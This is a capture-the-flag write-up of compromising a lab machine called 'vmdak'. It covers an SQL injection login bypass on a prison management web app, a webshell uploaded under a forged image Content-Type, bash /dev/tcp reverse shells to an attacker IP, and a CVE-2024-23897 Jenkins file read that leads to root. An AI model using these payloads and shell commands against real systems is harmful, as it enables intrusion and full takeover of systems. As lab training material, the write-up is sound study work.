# CTF Writeup: vmdak

---

## Reconaissance

An initial scan revealed the following information about running services on the target system.

```
nmap -A -p- --min-rate 10000 192.168.127.103
Starting Nmap 7.98 ( https://nmap.org ) at 2025-12-31 02:08 -0500
Nmap scan report for 192.168.127.103
Host is up (0.031s latency).
Not shown: 65531 closed tcp ports (reset)
PORT     STATE SERVICE  VERSION
21/tcp   open  ftp      vsftpd 3.0.5
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 192.168.45.155
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.5 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0            1752 Sep 19  2024 config.xml
22/tcp   open  ssh      OpenSSH 9.6p1 Ubuntu 3ubuntu13.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 76:18:f1:19:6b:29:db:da:3d:f6:7b:ab:f4:b5:63:e0 (ECDSA)
|_  256 cb:d8:d6:ef:82:77:8a:25:32:08:dd:91:96:8d:ab:7d (ED25519)
80/tcp   open  http     Apache httpd 2.4.58 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.58 (Ubuntu)
9443/tcp open  ssl/http Apache httpd 2.4.58 ((Ubuntu))
| ssl-cert: Subject: commonName=vmdak.local/organizationName=PrisonManagement/stateOrProvinceName=California/countryName=US
| Subject Alternative Name: DNS:vmdak.local
| Not valid before: 2024-08-20T09:21:33
|_Not valid after:  2025-08-20T09:21:33
|_http-title:  Home - Prison Management System
|_http-server-header: Apache/2.4.58 (Ubuntu)
| tls-alpn: 
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
Device type: general purpose|router
Running: Linux 5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 4 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 199/tcp)
HOP RTT      ADDRESS
1   28.08 ms 192.168.45.1
2   28.05 ms 192.168.45.254
3   28.15 ms 192.168.251.1
4   28.25 ms 192.168.127.103

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 27.83 seconds
```

The recon scan revealed that ftp is anonymously accessible.

Let's start with enumerating ftp.

Inside the ftp share is an config.xml stored, let's download it locally.

The file itself provided us with information that Jenkins is being used and "hudson 2.401.2" & an root password stored in /root/.jenkins/secrets/initialAdminPassword.

```
cat config.xml      
<?xml version='1.1' encoding='UTF-8'?>
<hudson>
  <disabledAdministrativeMonitors/>
  <version>2.401.2</version>
  <numExecutors>2</numExecutors>
  <mode>NORMAL</mode>
  <useSecurity>true</useSecurity>
  <authorizationStrategy class="hudson.security.FullControlOnceLoggedInAuthorizationStrategy">
    <denyAnonymousReadAccess>false</denyAnonymousReadAccess>
  </authorizationStrategy>
  <securityRealm class="hudson.security.HudsonPrivateSecurityRealm">
    <disableSignup>true</disableSignup>
    <enableCaptcha>false</enableCaptcha>
  </securityRealm>
  <disableRememberMe>false</disableRememberMe>
  <projectNamingStrategy class="jenkins.model.ProjectNamingStrategy$DefaultProjectNamingStrategy"/>
  <workspaceDir>${JENKINS_HOME}/workspace/${ITEM_FULL_NAME}</workspaceDir>
  <buildsDir>${ITEM_ROOTDIR}/builds</buildsDir>
  <jdks/>
  <viewsTabBar class="hudson.views.DefaultViewsTabBar"/>
  <myViewsTabBar class="hudson.views.DefaultMyViewsTabBar"/>
  <clouds/>
  <InitialRootPassword>/root/.jenkins/secrets/initialAdminPassword></InitialRootPassword>
  <scmCheckoutRetryCount>0</scmCheckoutRetryCount>
  <views>
    <hudson.model.AllView>
      <owner class="hudson" reference="../../.."/>
      <name>all</name>
      <filterExecutors>false</filterExecutors>
      <filterQueue>false</filterQueue>
      <properties class="hudson.model.View$PropertyList"/>
    </hudson.model.AllView>
  </views>
  <primaryView>all</primaryView>
  <slaveAgentPort>-1</slaveAgentPort>
  <label></label>
  <crumbIssuer class="hudson.security.csrf.DefaultCrumbIssuer">
    <excludeClientIPFromCrumb>false</excludeClientIPFromCrumb>
  </crumbIssuer>
  <nodeProperties/>
  <globalNodeProperties/>
  <nodeRenameMigrationNeeded>false</nodeRenameMigrationNeeded>
</hudson>
```

Let's move onto enumerating the websites, because the information provided seems to be help us later when we are inside the server.

Upon inspecting the webpage running on port 80, it seems to be an apache default page.

I tried to bruteforce hidden directories, but nothing was retrieved. I'm assuming the webpage on port 80 won't be our initial access. Let's move onto to the webpage running on port 9443.

Since this is an https webpage, let's view the certificate.

We get information that the dns name seems to be "vmdak.local". Let's map this domain to our target ip in our local dns file /etc/hosts.

```
sudo echo "192.168.127.103 vmdak.local" | sudo tee -a /etc/hosts
```

The webpage displayed seems to be running an web application called "Fast5 - Prison Management System". It provides an admin dashboard, an dashboard and an register functionality. 

Searching up for default credentials for this web application online lead to finding out about an SQL Injection Authentication Bypass.

```
https://www.exploit-db.com/exploits/52017
```

Apparently the exploit is very simple, if we take in the following credentials + SQLi we bypass the authentication.

```
username:admin' or '1'='1
password:123456
```

It worked! We are inside the CMS.

Upon inspecting "Leave Management" we retrieve potential credentials.

```
malcolm:RonnyCache001
```

We also retrieved the credentials for the "admin" user.

```
admin:admin123
```


## Initial Access

There seems to be an upload functionality in User Management > Edit Photo.

Let's first try and upload an .php shell.

I'm assuming it didn't work, due to the profile picture not changing.

Let's intercept traffic with burpsuite and perform packet manipulation.

We got an 200 response, but it still didn't work.

Enumerated endpoints to check for an /uploads directory.

```
dirsearch -u https://vmdak.local:9443/Admin
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3                                                                                                              
 (_||| _) (/_(_|| (_| )                                                                                                                       
                                                                                                                                              
Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/saitama/Desktop/Exploiting/OSCP_Prep/ProvingGrounds/Linux/vmdak/reports/https_vmdak.local_9443/_Admin_25-12-31_02-33-39.txt

Target: https://vmdak.local:9443/

[02:33:39] Starting: Admin/                                                                                                                   
[02:33:42] 403 -  278B  - /Admin/.ht_wsr.txt                                
[02:33:42] 403 -  278B  - /Admin/.htaccess.bak1                             
[02:33:42] 403 -  278B  - /Admin/.htaccess.orig                             
[02:33:42] 403 -  278B  - /Admin/.htaccess.sample                           
[02:33:42] 403 -  278B  - /Admin/.htaccess.save
[02:33:42] 403 -  278B  - /Admin/.htaccess_extra
[02:33:42] 403 -  278B  - /Admin/.htaccess_sc
[02:33:42] 403 -  278B  - /Admin/.htaccessBAK
[02:33:42] 403 -  278B  - /Admin/.htaccess_orig
[02:33:42] 403 -  278B  - /Admin/.htaccessOLD
[02:33:42] 403 -  278B  - /Admin/.htaccessOLD2
[02:33:42] 403 -  278B  - /Admin/.htm                                       
[02:33:42] 403 -  278B  - /Admin/.html
[02:33:42] 403 -  278B  - /Admin/.htpasswd_test                             
[02:33:42] 403 -  278B  - /Admin/.httr-oauth
[02:33:42] 403 -  278B  - /Admin/.htpasswds
[02:33:43] 403 -  278B  - /Admin/.php                                       
[02:33:54] 301 -  324B  - /Admin/build  ->  https://vmdak.local:9443/Admin/build/
[02:33:54] 200 -  479B  - /Admin/build/                                     
[02:33:57] 301 -  323B  - /Admin/dist  ->  https://vmdak.local:9443/Admin/dist/
[02:33:57] 200 -  467B  - /Admin/dist/
[02:34:00] 301 -  325B  - /Admin/images  ->  https://vmdak.local:9443/Admin/images/
[02:34:00] 200 -  529B  - /Admin/images/                                    
[02:34:02] 200 -    1KB - /Admin/login.php                                  
[02:34:02] 200 -   51B  - /Admin/logout.php                                 
[02:34:07] 301 -  326B  - /Admin/plugins  ->  https://vmdak.local:9443/Admin/plugins/
[02:34:07] 200 -    1KB - /Admin/plugins/                                   
[02:34:08] 200 -    4KB - /Admin/README.md                                  
                                                                             
Task Completed 
```

I found the /images directory in which the user profile picture was stored of the admin user.

Let's try and use an webshell instead of an reverse shell & modify the Headers within the request aswell.

Successfully uploaded the webshell after modifying the Header --> Content-Type from application/x-php to:

```
Content-Type: image/jpeg
```

Navigated to User Management > Admin Record.

I then right clicked on the picture and pressed "Open Image in new tab".

Gained Command Execution on the target system.

Started up my listener on port 80.

```
nc -lvnp 80
```

Utilized the following command.

```
/bin/bash -c 'bash -i >& /dev/tcp/192.168.45.191/80 0>&1'
```

Gained RCE as user "www-data".

```
nc -lvnp 80                                 
listening on [any] 80 ...
connect to [192.168.45.191] from (UNKNOWN) [192.168.127.103] 38856
bash: cannot set terminal process group (50245): Inappropriate ioctl for device
bash: no job control in this shell
www-data@vmdak:/var/www/prison/uploadImage$
```

Logged in as user "vmdak" with the password we enumerated earlier on the CMS.

```
www-data@vmdak:/home$ su vmdak
su vmdak
Password: RonnyCache001
whoami
vmdak
```

Retrieved local.txt in /home/vmdak directory.

```
e4f17da6ff35595a10ee1b6dd960254d
```

## Privilege Escalation

Performed Shell Hardening.

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
CTRL + Z
stty raw -echo ; fg ; reset
stty columns 200 rows 200
export TERM=xterm
```

Observing running services on the target system, we discovered an service running internally on port 8080 --> Jenkins.

```
vmdak@vmdak:~$ netstat -tulnp
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:21              0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:9443            0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.54:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
udp        0      0 127.0.0.54:53           0.0.0.0:*                           -                   
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -
```

At the beginning we discovered the config.xml within the ftp share which hinted at an root password and jenkins version information. Let's first of all ssh into user "vmdak" with port forwarding, to enumerate the service.

```
ssh -L 8081:127.0.0.1:8080 vmdak@vmdak.local
vmdak@vmdak.local's password: 

Permission denied, please try again.
vmdak@vmdak.local's password: 
Welcome to Ubuntu 24.04 LTS (GNU/Linux 6.8.0-40-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Wed Dec 31 07:53:47 AM UTC 2025

  System load:  0.0                Processes:               232
  Usage of /:   34.3% of 18.53GB   Users logged in:         0
  Memory usage: 46%                IPv4 address for ens160: 192.168.127.103
  Swap usage:   0%


Expanded Security Maintenance for Applications is not enabled.

201 updates can be applied immediately.
To see these additional updates run: apt list --upgradable

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


*** System restart required ***
Last login: Wed Dec 31 07:52:29 2025 from 192.168.45.155
$
```

Upon accessing jenkins in the webbrowser with:

```
http://127.0.0.1:8081/login?from=%2F
```

We are getting greeted by an webpage, which wants us to use the Administrator Password in /root/.jenkins/secrets/initialAdminPassword in order to Unlock Jenkins. Which means we are stuck now.

Let's search for CVE's for Jenkins "hudson 2.401.2" maybe we can utilize smth in order to get this password.

I immediatly found the following CVE-2024-23897 and an exploit to it. The Exploit allows us to read the admin password stored in /root.

```
git clone https://github.com/godylockz/CVE-2024-23897.git
```

Ran the exploit and gained the administrator password.

```
python3 jenkins_fileread.py -u http://127.0.0.1:8081 -f /root/.jenkins/secrets/initialAdminPassword
 
140ef31373034d19a77baa9c6b84a200
```

After logging in and accessing Jenkins I navigated to Manage Jenkins > System > Scrolled Down to Shell.

Apparently we can run executable scripts here. So I navigated to the /tmp directory and created an malicious .sh script which should spawn us with an reverse shell.

```
$ cat shell.sh
#!/bin/bash

/bin/bash -c 'bash -i >& /dev/tcp/192.168.45.191/22 0>&1'
```

Started up my listener on port 22.

```
nc -lvnp 222
```

I navigated to Item > Entered an Project Name > Pressed on Freestyle Project and Okey > Pressed Build Now

Gained RCE as user "root".

```
nc -lvnp 22
listening on [any] 22 ...
connect to [192.168.45.191] from (UNKNOWN) [192.168.127.103] 44946
bash: cannot set terminal process group (48037): Inappropriate ioctl for device
bash: no job control in this shell
root@vmdak:~/.jenkins/workspace/dwqdqw#
```


Retrieved proof.txt in /root directory.

```
9b4843138e7b8ba5e5d91c705ee94ec2
```
